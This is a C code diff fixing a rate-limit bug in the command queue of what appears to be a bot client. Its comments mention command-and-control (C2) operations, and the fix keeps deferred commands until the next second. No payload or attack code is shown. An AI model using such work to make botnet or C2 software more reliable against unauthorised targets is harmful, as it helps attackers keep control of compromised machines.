@@ -2124,16 +2124,28 @@ int protocol_process_commands(notnet_bot_t *bot) {
         bot->last_cmd_time = now;
         bot->cmd_this_second = 0;
     }
-    /* SECURITY FIX (#27): Process up to 10 commands per second, skip excess.
+    /* SECURITY FIX (#27): Process up to 10 commands per second, defer excess.
      * Previously: if rate limit hit, ALL commands dropped (cmd_count=0).
-     * Now: process up to 10, skip the rest, preserving unprocessed commands. */
+     * (#107): the deferral was cosmetic — skipped commands sat in the queue
+     * but the unconditional cmd_count=0 at the end wiped them anyway, so the
+     * behavior was identical to the pre-#27 bug for the deferred entries.
+     * Now: compact the deferred commands to the queue front and keep
+     * cmd_count at the deferred count, so they are processed next second. */
     int skipped = 0;
+    int keep = 0;   /* write index for deferred (skipped) commands */
 
     for (int i = 0; i < bot->cmd_count; i++) {
         char *cmd = bot->cmd_queue[i];
         if (bot->cmd_this_second >= 10) {
-            log_warn("CMD: rate limit exceeded, skipping command %d", i);
+            log_warn("CMD: rate limit exceeded, deferring command %d", i);
             skipped++;
+            if (keep != i) {
+                /* Move the deferred entry to the front so it survives the
+                 * queue reset below (cmd_queue is 256-byte rows; rows never
+                 * overlap). */
+                memmove(bot->cmd_queue[keep], bot->cmd_queue[i], 256);
+            }
+            keep++;
             continue;
         }
         bot->cmd_this_second++;
@@ -3126,16 +3138,18 @@ int protocol_process_commands(notnet_bot_t *bot) {
     }
     
     if (skipped > 0) {
-        log_warn("CMD: %d commands skipped due to rate limit", skipped);
+        log_warn("CMD: %d commands deferred due to rate limit (kept for next second)", skipped);
     }
 
-    /* Clear processed commands */
-    /* SECURITY FIX (#9): Only clear the queue when processing completed
+    /* Clear processed commands.
+     * SECURITY FIX (#9): Only clear the queue when processing completed
      * normally. Connection failures during C2 ops should not silently
      * drop unprocessed commands. Clear unconditionally only if we
      * reached here — processing errors within the loop use continue
-     * and still fall through to this clear. */
-    bot->cmd_count = 0;
+     * and still fall through to this clear.
+     * (#107): keep deferred (rate-limited) commands — they were compacted
+     * to the front by the loop above, so cmd_count = keep (not 0). */
+    bot->cmd_count = keep;
     
     return 0;
 }
